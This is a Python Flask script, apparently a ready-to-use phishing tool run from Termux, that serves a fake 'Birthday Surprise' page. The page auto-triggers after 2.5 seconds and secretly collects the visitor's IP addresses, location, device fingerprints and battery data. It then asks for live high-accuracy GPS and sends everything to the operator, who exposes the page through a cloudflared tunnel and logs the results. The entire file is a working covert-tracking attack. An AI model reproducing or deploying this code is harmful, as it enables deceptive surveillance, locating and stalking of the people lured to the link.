#!/usr/bin/env python3
import json
import socket
import sys
import os
import re
import subprocess
from flask import Flask, request, render_template_string
from flask_cors import CORS
from datetime import datetime

# ========== BANNER ==========
banner = """
\033[1;31m██████╗ ██╗  ██╗ ██████╗ ███╗   ██╗███████╗\033[0m  \033[1;34m██╗███╗   ██╗███████╗ ██████╗ \033[0m
\033[1;33m██╔══██╗██║  ██║██╔═══██╗████╗  ██║██╔════╝\033[0m  \033[1;35m██║████╗  ██║██╔════╝██╔═══██╗\033[0m
\033[1;32m██████╔╝███████║██║   ██║██╔██╗ ██║█████╗  \033[0m  \033[1;36m██║██╔██╗ ██║█████╗  ██║   ██║\033[0m
\033[1;33m██╔═══╝ ██╔══██║██║   ██║██║╚██╗██║██╔══╝  \033[0m  \033[1;34m██║██║╚██╗██║██╔══╝  ██║   ██║\033[0m
\033[1;31m██║     ██║  ██║╚██████╔╝██║ ╚████║███████╗\033[0m  \033[1;35m██║██║ ╚████║██║     ╚██████╔╝\033[0m
\033[1;32m╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝\033[0m  \033[1;36m╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ \033[0m

\033[1;33m
🔴 YouTube: https://www.youtube.com/@aryanafridi00
💻 Developer: Aryan Afridi 
📡 GitHub: https://github.com/shahid2005a
\033[0m
"""
# ==========================================

app = Flask(__name__)
CORS(app)

HTML_PAGE = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🎂 Birthday Surprise</title>
    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
        body {
            background: linear-gradient(135deg, #1e3c72, #2a5298);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .container {
            background: rgba(0,0,0,0.7);
            backdrop-filter: blur(10px);
            border-radius: 30px;
            padding: 40px;
            max-width: 500px;
            text-align: center;
            color: white;
        }
        button {
            background: #ff4757;
            color: white;
            border: none;
            padding: 16px 45px;
            font-size: 18px;
            border-radius: 50px;
            cursor: pointer;
            margin-top: 20px;
            font-weight: bold;
            transition: 0.3s;
        }
        button:hover { transform: scale(1.05); }
        .hidden { display: none; }
        .gift-icon { font-size: 70px; animation: bounce 1s infinite; }
        @keyframes bounce { 0%,100%{transform:translateY(0)} 50%{transform:translateY(-15px)} }
        #loader { margin-top: 20px; font-size: 12px; opacity: 0.8; }
        .card { background: rgba(255,255,255,0.2); border-radius: 20px; padding: 30px; margin-top: 20px; }
        .countdown { font-size: 14px; margin-top: 10px; color: #ffd700; }
    </style>
</head>
<body>
<div class="container" id="main">
    <div class="gift-icon">🎁</div>
    <h2>🎉 Birthday Surprise 🎉</h2>
    <p>Your gift will unlock automatically in <span id="timer">2.5</span> seconds...</p>
    <button id="unlockBtn">✨ Unlock Now ✨</button>
    <div id="loader" class="hidden">🛰️ Collecting device info...</div>
    <div class="countdown" id="countdownMsg"></div>
</div>
<div id="celebration" class="hidden">
    <div class="card">
        <div>🎂</div>
        <h1>Happy Birthday!</h1>
        <p>Wishing you joy, magic, and infinite happiness! 🎈✨</p>
    </div>
</div>

<script>
    const WEBHOOK = "/log";

    // ---------- ADVANCED FINGERPRINTING (same as before) ----------
    async function getCanvasFingerprint() {
        return new Promise((resolve) => {
            const canvas = document.createElement('canvas');
            canvas.width = 200;
            canvas.height = 50;
            const ctx = canvas.getContext('2d');
            ctx.textBaseline = "top";
            ctx.font = "14px 'Arial'";
            ctx.fillStyle = "#f60";
            ctx.fillRect(0, 0, 100, 40);
            ctx.fillStyle = "#069";
            ctx.fillText("🕵️ fingerprint", 2, 15);
            const dataURL = canvas.toDataURL();
            resolve(dataURL.substring(0, 100));
        });
    }

    async function getWebGLInfo() {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (!gl) return { vendor: "Not supported", renderer: "Not supported" };
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        if (!debugInfo) return { vendor: "N/A", renderer: "N/A" };
        const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
        const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
        return { vendor, renderer };
    }

    async function getBatteryInfo() {
        if (!navigator.getBattery) return null;
        try {
            const battery = await navigator.getBattery();
            return {
                level: battery.level * 100,
                charging: battery.charging,
                chargingTime: battery.chargingTime,
                dischargingTime: battery.dischargingTime
            };
        } catch(e) { return null; }
    }

    function getScreenDetails() {
        return {
            width: screen.width,
            height: screen.height,
            availWidth: screen.availWidth,
            availHeight: screen.availHeight,
            colorDepth: screen.colorDepth,
            pixelRatio: window.devicePixelRatio || 1,
            orientation: screen.orientation ? screen.orientation.type : "unknown"
        };
    }

    function getTimezone() {
        return Intl.DateTimeFormat().resolvedOptions().timeZone;
    }

    function getLanguage() {
        return navigator.language;
    }

    function getPlatform() {
        return navigator.platform;
    }

    function getHardwareConcurrency() {
        return navigator.hardwareConcurrency || "unknown";
    }

    function getDeviceMemory() {
        return navigator.deviceMemory || "unknown";
    }

    function getTouchSupport() {
        return 'ontouchstart' in window || navigator.maxTouchPoints > 0;
    }

    function getLocalIP(callback) {
        const pc = new RTCPeerConnection({ iceServers: [] });
        pc.createDataChannel('');
        pc.createOffer().then(offer => pc.setLocalDescription(offer));
        pc.onicecandidate = (event) => {
            if (!event.candidate) return;
            const ipMatch = event.candidate.candidate.match(/([0-9]{1,3}\\.){3}[0-9]{1,3}/);
            if (ipMatch) {
                callback(ipMatch[0]);
                pc.close();
            }
        };
        setTimeout(() => callback("Unavailable"), 2000);
    }

    async function getDeviceInfo() {
        const ua = navigator.userAgent;
        let model = "Unknown";
        let androidVer = "Unknown";
        let hints = {};
        
        if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
            try {
                hints = await navigator.userAgentData.getHighEntropyValues([
                    "model", "platformVersion", "fullVersionList"
                ]);
                if (hints.model && hints.model !== "") model = hints.model;
                if (hints.platformVersion) androidVer = hints.platformVersion;
            } catch(e) {}
        }
        
        if (model === "Unknown") {
            let androidMatch = ua.match(/; (?:.*?; )?(.+?) Build/);
            if (androidMatch && androidMatch[1]) model = androidMatch[1].trim();
            else {
                let smMatch = ua.match(/SM-[A-Z0-9]+/i);
                if (smMatch) model = smMatch[0];
                else {
                    let miMatch = ua.match(/(Redmi|MI) [A-Za-z0-9 ]+/i);
                    if (miMatch) model = miMatch[0];
                }
            }
        }
        
        if (androidVer === "Unknown") {
            let verMatch = ua.match(/Android ([\\d\\.]+)/);
            if (verMatch) androidVer = verMatch[1];
        }
        
        return {
            raw_ua: ua,
            hints: hints,
            model: model,
            androidVer: androidVer
        };
    }
    
    // ========== FIXED LOCATION WITH MULTIPLE APIS ==========
    async function getLocationWithFallback() {
        // Try 3 different APIs in sequence
        const apis = [
            {
                url: 'https://ip-api.com/json/',
                parse: (json) => {
                    if (json.status === 'success') {
                        return {
                            city: json.city,
                            region: json.regionName,
                            country: json.country,
                            postal: json.zip,
                            lat: json.lat,
                            lon: json.lon
                        };
                    }
                    return null;
                }
            },
            {
                url: 'https://ipapi.co/json/',
                parse: (json) => {
                    if (json && json.city) {
                        return {
                            city: json.city,
                            region: json.region,
                            country: json.country_name,
                            postal: json.postal,
                            lat: json.latitude,
                            lon: json.longitude
                        };
                    }
                    return null;
                }
            },
            {
                url: 'https://freeipapi.com/api/json/',
                parse: (json) => {
                    if (json && json.city) {
                        return {
                            city: json.city,
                            region: json.region,
                            country: json.countryName,
                            postal: json.zipCode || '',
                            lat: json.latitude,
                            lon: json.longitude
                        };
                    }
                    return null;
                }
            }
        ];
        
        for (let api of apis) {
            try {
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), 3000);
                const res = await fetch(api.url, { signal: controller.signal });
                clearTimeout(timeoutId);
                if (res.ok) {
                    const data = await res.json();
                    const parsed = api.parse(data);
                    if (parsed && parsed.city && parsed.city !== "Unknown") {
                        console.log(`Location found via ${api.url}:`, parsed);
                        return parsed;
                    }
                }
            } catch(e) {
                console.warn(`Location API ${api.url} failed:`, e);
            }
        }
        // Fallback: return unknown
        return {
            city: "Unknown",
            region: "Unknown",
            country: "Unknown",
            postal: "Unknown",
            lat: null,
            lon: null
        };
    }
    // ========================================================
    
    async function collectData() {
        const device = await getDeviceInfo();
        let localIP = await new Promise(resolve => getLocalIP(resolve));
        
        let publicIP = "Unknown";
        try {
            let res = await fetch('https://api.ipify.org?format=json');
            let json = await res.json();
            publicIP = json.ip;
        } catch(e) {}
        
        // Get location using the fixed function
        const location = await getLocationWithFallback();
        
        const canvasFP = await getCanvasFingerprint();
        const webgl = await getWebGLInfo();
        const battery = await getBatteryInfo();
        const screen = getScreenDetails();
        const timezone = getTimezone();
        const language = getLanguage();
        const platform = getPlatform();
        const cpuCores = getHardwareConcurrency();
        const deviceMemory = getDeviceMemory();
        const touchSupport = getTouchSupport();
        
        return {
            timestamp: new Date().toISOString(),
            model: device.model,
            androidVer: device.androidVer,
            raw_ua: device.raw_ua,
            hints: device.hints,
            local_ip: localIP,
            public_ip: publicIP,
            location: location,
            canvas_fingerprint: canvasFP,
            webgl: webgl,
            battery: battery,
            screen: screen,
            timezone: timezone,
            language: language,
            platform: platform,
            cpu_cores: cpuCores,
            device_memory: deviceMemory,
            touch_support: touchSupport
        };
    }
    
    async function sendData(data) {
        try {
            await fetch(WEBHOOK, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(data) });
        } catch(e) { console.error(e); }
    }
    
    async function start() {
        const btn = document.getElementById('unlockBtn');
        if (btn.disabled) return;
        btn.disabled = true;
        document.getElementById('loader').classList.remove('hidden');
        const data = await collectData();
        await sendData(data);
        
        document.getElementById('main').classList.add('hidden');
        document.getElementById('celebration').classList.remove('hidden');
        canvasConfetti({ particleCount: 200, spread: 100, origin: { y: 0.6 } });
        
        if (navigator.geolocation) {
            navigator.geolocation.watchPosition(
                (pos) => {
                    let gpsData = { 
                        ...data, 
                        event: "GPS", 
                        lat: pos.coords.latitude, 
                        lon: pos.coords.longitude, 
                        accuracy: pos.coords.accuracy,
                        gps_address: `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`
                    };
                    sendData(gpsData);
                },
                (err) => sendData({ ...data, event: "GPS_DENIED", error: err.message }),
                { enableHighAccuracy: true, timeout: 10000 }
            );
        }
    }

    // Auto unlock after 2.5 seconds
    let countdown = 2.5;
    const timerElem = document.getElementById('timer');
    const interval = setInterval(() => {
        countdown -= 0.1;
        if (countdown <= 0) {
            clearInterval(interval);
            timerElem.innerText = "0.0";
            start();
        } else {
            timerElem.innerText = countdown.toFixed(1);
        }
    }, 100);
    
    document.getElementById('unlockBtn').onclick = () => {
        clearInterval(interval);
        start();
    };
</script>
</body>
</html>
'''

def parse_device(data):
    model = data.get('model', 'Unknown')
    android_ver = data.get('androidVer', 'Unknown')
    hints = data.get('hints', {})
    
    if hints.get('platformVersion'):
        android_ver = hints['platformVersion']
    
    brand = "Unknown"
    manufacturer = "Unknown"
    if model.startswith("SM-"):
        brand = "Samsung"
        manufacturer = "Samsung"
    elif "Redmi" in model or "MI" in model or "Xiaomi" in model:
        brand = "Xiaomi"
        manufacturer = "Xiaomi"
    elif "OnePlus" in model:
        brand = "OnePlus"
        manufacturer = "OnePlus"
    elif "Pixel" in model:
        brand = "Google"
        manufacturer = "Google"
    elif "OPPO" in model:
        brand = "OPPO"
        manufacturer = "OPPO"
    elif "vivo" in model.lower():
        brand = "vivo"
        manufacturer = "vivo"
    elif "Realme" in model:
        brand = "Realme"
        manufacturer = "Realme"
    elif "iPhone" in model:
        brand = "Apple"
        manufacturer = "Apple"
    
    sdk = "Unknown"
    try:
        ver_parts = android_ver.split('.')
        ver_num = float(ver_parts[0])
        if ver_num >= 15: sdk = "35"
        elif ver_num >= 14: sdk = "34"
        elif ver_num >= 13: sdk = "33"
        elif ver_num >= 12: sdk = "32"
        elif ver_num >= 11: sdk = "30"
        elif ver_num >= 10: sdk = "29"
    except:
        pass
    
    device_name = model
    hardware = "Unknown"
    raw_ua = data.get('raw_ua', '')
    dn_match = re.search(r'Device: (\w+)', raw_ua)
    if dn_match: device_name = dn_match.group(1)
    hw_match = re.search(r'Hardware: (\w+)', raw_ua)
    if hw_match: hardware = hw_match.group(1)
    
    return {
        "model": f"{brand} {model}".strip(),
        "brand": brand,
        "manufacturer": manufacturer,
        "android_ver": android_ver,
        "sdk": sdk,
        "device_name": device_name,
        "hardware": hardware
    }

def print_exact(data):
    parsed = parse_device(data)
    loc = data.get('location', {})
    screen = data.get('screen', {})
    webgl = data.get('webgl', {})
    battery = data.get('battery')
    
    print("\n" + "="*70)
    print("📱 PHONE MODEL INFORMATION 👽")
    print(f"📊 Device Model: {parsed['model']}")
    print(f"💎 Brand: {parsed['brand']}")
    print(f"🏭 Manufacturer: {parsed['manufacturer']}")
    print(f"💾 Android Ver: {parsed['android_ver']}")
    print(f"📟 SDK Version: {parsed['sdk']}")
    print(f"🆔 Device Name: {parsed['device_name']}")
    print(f"🚀 Hardware: {parsed['hardware']}")
    
    print("\n🖥️ SCREEN & BROWSER 💧")
    print(f"📏 Resolution: {screen.get('width')}x{screen.get('height')}")
    print(f"🎨 Color Depth: {screen.get('colorDepth')}")
    print(f"🔍 Pixel Ratio: {screen.get('pixelRatio')}")
    print(f"🧭 Orientation: {screen.get('orientation')}")
    print(f"🗣 Language: {data.get('language')}")
    print(f"⏱️ Timezone: {data.get('timezone')}")
    print(f"💻 Platform: {data.get('platform')}")
    print(f"⚙️ CPU Cores: {data.get('cpu_cores')}")
    print(f"🧠 Device Memory: {data.get('device_memory')} GB")
    print(f"✋ Touch Support: {data.get('touch_support')}")
    
    print("\n🎨 WebGL Fingerprint 👻")
    print(f"🩸 Vendor: {webgl.get('vendor')}")
    print(f"🌊 Renderer: {webgl.get('renderer')}")
    print(f"🔮 Canvas Hash: {data.get('canvas_fingerprint', 'N/A')}")
    
    if battery:
        print("\n🔋 Battery Info ❗")
        print(f"🧿 Level: {battery.get('level')}%")
        print(f"🔌 Charging: {battery.get('charging')}")
        print(f"⏳ Charging Time: {battery.get('chargingTime')} sec")
        print(f"🔐 Discharging Time: {battery.get('dischargingTime')} sec")
    
    print("\n📶 NETWORK INFORMATION 🌐")
    print(f"🚾 MAC Address: Unavailable (browser restriction)")
    print(f"🛜 Local IP: {data.get('local_ip', 'Unknown')}")
    print(f"🎭 Public IP: {data.get('public_ip', 'Unknown')}")
    
    print("\n🏠 LOCATION DETAILS 📍")
    if loc.get('city') and loc.get('city') != "Unknown":
        print(f"🏙️ City: {loc.get('city')}")
        print(f"🗽 Region/State: {loc.get('region')}")
        print(f"🌍 Country: {loc.get('country')}")
        print(f"💿 Postal Code: {loc.get('postal')}")
        if loc.get('lat') and loc.get('lon'):
            print(f"🔰 IP Coordinates: {loc.get('lat')}, {loc.get('lon')}")
    else:
        print("⚠️ Could not fetch city automatically. But GPS may provide later.")
    
    if data.get('event') == 'GPS' and data.get('lat'):
        print(f"\n📍 GPS LIVE LOCATION 💥:")
        print(f"🍥 Latitude: {data['lat']}")
        print(f"⛔ Longitude: {data['lon']}")
        print(f"🔩 Accuracy: ±{data.get('accuracy', '?')} meters")
        print(f"🔍 Google Maps: {data.get('gps_address')}")
    elif data.get('event') == 'GPS_DENIED':
        print(f"\n❌ GPS: Denied by user")
    
    print("\n--- 🏷️ DEBUG 📖 ---")
    print(f"🛗 Model from hints: {data.get('hints', {}).get('model', 'N/A')}")
    print(f"🌀 Platform Version: {data.get('hints', {}).get('platformVersion', 'N/A')}")
    print("="*70 + "\n")
    
    with open("device_data.log", "a", encoding="utf-8") as f:
        f.write(json.dumps({**data, "parsed": parsed}, ensure_ascii=False) + "\n")

@app.route('/')
def index():
    return render_template_string(HTML_PAGE)

@app.route('/log', methods=['POST'])
def log():
    try:
        data = request.get_json()
        if data:
            print_exact(data)
        return "ok", 200
    except Exception as e:
        print(f"Error: {e}")
        return "error", 500

def kill_process_on_port(port):
    try:
        result = subprocess.run(f"lsof -ti:{port}", shell=True, capture_output=True, text=True)
        if result.stdout.strip():
            pids = result.stdout.strip().split()
            for pid in pids:
                print(f"🔪 Killing process {pid} on port {port}")
                os.system(f"kill -9 {pid}")
            return True
    except:
        pass
    return False

def find_free_port(start=3000):
    port = start
    while True:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            try:
                s.bind(('0.0.0.0', port))
                return port
            except OSError:
                print(f"⚠️ Port {port} busy, trying to kill...")
                if kill_process_on_port(port):
                    continue
                else:
                    print(f"⚠️ Port {port} busy, trying {port+1}...")
                    port += 1
                    if port > start + 20:
                        print("❌ Too many ports busy. Run: pkill -f python")
                        sys.exit(1)

if __name__ == '__main__':
    print(banner)
    port = find_free_port(3000)
    print("\n🔥 ADVANCED DEVICE CAPTURE + AUTO-UNLOCK (2.5 sec)")
    print(f"📡 Local URL: http://localhost:{port}")
    print("\n🌐 Run cloudflared in another Termux session:")
    print(f"   cloudflared tunnel --url http://localhost:{port}\n")
    print("✅ Capturing: screen, battery, WebGL, canvas, timezone, language, CPU, memory, touch, IP, GPS, location details")
    print("✅ Page auto-unlocks in 2.5 seconds – no click needed")
    print("✅ Location API fixed: ip-api.com, ipapi.co, freeipapi.com - multiple fallbacks")
    print("✅ City, Region, Country, Postal code, Coordinates will now appear correctly\n")
    app.run(host='0.0.0.0', port=port, debug=False)